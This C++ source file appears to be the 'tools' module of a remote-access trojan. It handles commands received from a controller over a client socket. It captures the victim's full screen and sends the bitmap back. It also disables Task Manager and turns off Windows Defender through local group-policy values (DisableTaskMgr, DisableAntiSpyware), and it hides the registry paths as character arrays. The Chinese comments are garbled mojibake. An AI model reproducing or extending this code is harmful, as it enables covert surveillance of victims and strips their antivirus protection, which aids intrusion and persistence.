#define INITGUID
#include "ToolsManager.h"
#include<wingdi.h>
#include <GPEdit.h>
#include <winnt.h>

#define TAG_DEV_PLAS  1
#define BITS_PER_PIX  32
#define NO_COLOR_TAB  0
#define UNCMP_RGB     0
#define H_RESOL_0     0
#define V_RESOL_0     0
#define ALL_COLOR     0
#define MUST_ZERO     0
#define TYPE_BMP      0x4D42
#define FILE_HEAD     sizeof(BITMAPFILEHEADER)
#define INFO_HEAD     sizeof(BITMAPINFOHEADER)
#define HEAD_SIZE     sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER)


CToolsManager::CToolsManager(CClientSocket* pClient) :CManager(pClient)
{
	BYTE buff = TOKEN_TOOLS;
	Send(&buff,1);
}

CToolsManager::~CToolsManager()
{
	//ExitProcess(0);
}

void CToolsManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{

		case DESK_TOP: SendScreenshots(); break;
		case DISABLE_TASK:SetTDisableTaskMgr(1); break;
		case ENABLE_TASK:SetTDisableTaskMgr(0); break;
		case DISABLE_DEF:SetTDisableDef(1); break;
		case ENABLE_DEF:SetTDisableDef(0); break;	
	}
}
void CToolsManager::SendScreenshots()
{
	// �����ʾ��
	HDC hCurrScreen = GetDC(NULL);
	//����һ�����ݵ�DC,���ڴ��б�ʾ��ǰλͼ��������
	HDC hCmpDC = CreateCompatibleDC(hCurrScreen);
	//���
	int iScreenWidth = GetDeviceCaps(hCurrScreen, HORZRES);
	int iScreenHeight = GetDeviceCaps(hCurrScreen, VERTRES);
	//��ǰ��Ļλͼ
	HBITMAP hBmp = CreateCompatibleBitmap(hCurrScreen, iScreenWidth, iScreenHeight);
	//�õ�ǰλͼ�����ʾ�ڴ�����Ļλͼ������
	SelectObject(hCmpDC, hBmp);
	//����ǰ��Ļͼ���Ƶ��ڴ���
	BOOL ret = BitBlt(hCmpDC, 0, 0, iScreenWidth, iScreenHeight, hCurrScreen, 0, 0, SRCCOPY);
	//BMPͼ����Ϣͷ
	BITMAPINFOHEADER hBmpInfo;
	hBmpInfo.biSize = INFO_HEAD;
	hBmpInfo.biWidth = iScreenWidth;
	hBmpInfo.biHeight = iScreenHeight;
	hBmpInfo.biPlanes = TAG_DEV_PLAS;
	hBmpInfo.biClrUsed = NO_COLOR_TAB;
	hBmpInfo.biBitCount = BITS_PER_PIX;
	hBmpInfo.biSizeImage = UNCMP_RGB;
	hBmpInfo.biCompression = BI_RGB;
	hBmpInfo.biClrImportant = ALL_COLOR;
	hBmpInfo.biXPelsPerMeter = H_RESOL_0;
	hBmpInfo.biYPelsPerMeter = V_RESOL_0;

	/* * * * * * * * * * * * * * * * * * * *
	 * Windows��4�ֽڷ����ڴ�
	 * ���ȼ���ÿ������Ҫ��bit��,����4�ֽڶ���
	 * ���������ݳ�4,��DWORDתΪBYTE
	 * ÿ��ʵ����ռBYTE��ͼ�������õ�����Դ��С
	 * * * * * * * * * * * * * * * * * * * */
	DWORD dwSrcSize = ((iScreenWidth * hBmpInfo.biBitCount + 31) / 32) * 4 * iScreenHeight;
	//��ͼ�ܴ�С
	DWORD dwPicSize = HEAD_SIZE + dwSrcSize;
	//BMPͼ���ļ�ͷ
	BITMAPFILEHEADER hBmpFile;
	hBmpFile.bfSize = dwPicSize;
	hBmpFile.bfType = TYPE_BMP;
	hBmpFile.bfOffBits = HEAD_SIZE;
	hBmpFile.bfReserved1 = MUST_ZERO;
	hBmpFile.bfReserved2 = MUST_ZERO;
	//BMPͼ������Դ
	char* bmpSrc = new char[dwSrcSize];
	ZeroMemory(bmpSrc, dwSrcSize);
	//����ָ���ļ���λͼ�е�����λԪ����
	//�����Ƶ�ָ����ʽ���豸�޹�λͼ�Ļ�����
	GetDIBits(hCmpDC, hBmp, 0, (UINT)iScreenHeight, bmpSrc, (BITMAPINFO*)&hBmpInfo, DIB_RGB_COLORS);
	//��������������Ϣ
	char* szBmp = new char[dwPicSize];
	ZeroMemory(szBmp, dwPicSize);
	memcpy(szBmp, (void*)&hBmpFile, FILE_HEAD);
	memcpy(szBmp + FILE_HEAD, (void*)&hBmpInfo, INFO_HEAD);
	memcpy(szBmp + HEAD_SIZE, bmpSrc, dwSrcSize);
	LPBYTE	lpPacket = new BYTE[dwPicSize + 1];
	lpPacket[0] = DESK_TOP;
	memcpy(lpPacket + 1, szBmp, dwPicSize);
	m_pClient->Send(lpPacket, dwPicSize + 1);
	//�ͷ���Դ
	DeleteObject(hBmp);
	DeleteObject(hCmpDC);
	ReleaseDC(NULL, hCurrScreen);
	delete[] szBmp;
	delete[] bmpSrc;
	delete[] lpPacket;
	szBmp = nullptr;
	bmpSrc = nullptr;
}

//�Ƿ�������������
void CToolsManager::SetTDisableTaskMgr(BOOL swiTch)
{
	char path[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','P','o','l','i','c','i','e','s','\\','S','y','s','t','e','m',0};
	SetGroupPolicy(GPO_SECTION_USER, path,"DisableTaskMgr", swiTch);
	BYTE ret = OK;
	Send(&ret, 1);
}

/// <summary>
///  �޸������
/// </summary>
/// <param name="dwSection">GPO_SECTION_MACHINE ���� GPO_SECTION_USER ����ע���ĸ�·��</param>
/// <param name="RegPath">�޸ĵ�ע���·��</param>
/// <param name="Regkey">ע���ļ�</param>
/// <param name="swiTch">ע����ֵ</param>
void CToolsManager::SetGroupPolicy(DWORD dwSection, char* RegPath, char* Regkey, DWORD  swiTch)
{
	if (::CoInitialize(NULL) != S_OK)
		return;

	LRESULT																		status;
	LRESULT																		hr = S_OK;
	IGroupPolicyObject*													pGPO = NULL;
	HKEY																			hKey = NULL;

	//����ʵ��
	hr = CoCreateInstance(CLSID_GroupPolicyObject, NULL, CLSCTX_INPROC_SERVER, IID_IGroupPolicyObject, (LPVOID*)&pGPO);
	if (hr != S_OK)
	{
		::CoUninitialize();
		return;
	}

	//��ע���
	HKEY hGPOKey = 0;
	hr = pGPO->OpenLocalMachineGPO(GPO_OPEN_LOAD_REGISTRY);
	if (SUCCEEDED(hr))
	{
		//��ȡע���
		hr = pGPO->GetRegistryKey(dwSection, &hGPOKey);
		if (SUCCEEDED(hr))
		{
			//ע��������ʱ�ʹ���һ��
			status = RegOpenKeyEx(hGPOKey, RegPath, 0, KEY_WRITE, &hKey);
			if (status != ERROR_SUCCESS)
			{
				status = RegCreateKeyEx(hGPOKey, RegPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
			}
			
			//����ע���
			DWORD lpData = swiTch;
			status = RegSetKeyValue(hKey, NULL, Regkey, REG_DWORD, (LPCVOID)&lpData, 4);

			RegCloseKey(hKey);

			RegCloseKey(hGPOKey);

			GUID Registerid = REGISTRY_EXTENSION_GUID;
			GUID ThisGuid = {
				0x0F6B957E,
				0x509E,
				0x11D1,
				{0xA7, 0xCC, 0x00, 0x00, 0xF8, 0x75, 0x71, 0xE3}
			};
			if (dwSection == GPO_SECTION_MACHINE)
			{
				//���µ����������
				status = pGPO->Save(TRUE, TRUE, &Registerid, &ThisGuid);
			}
			else
			{
				//���µ��û�����
				status = pGPO->Save(FALSE, TRUE, &Registerid, &ThisGuid);
			}
			pGPO->Release();
		}
	}
	::CoUninitialize();
}

//�Ƿ����windows def
void CToolsManager::SetTDisableDef(BOOL swiTch)
{
	char path[] = { 'S','o','f','t','w','a','r','e','\\','P','o','l','i','c','i','e','s','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','D','e','f','e','n','d','e','r',0};
	SetGroupPolicy(GPO_SECTION_MACHINE, path, "DisableAntiSpyware", swiTch);
	BYTE ret = OK;
	Send(&ret, 1);
}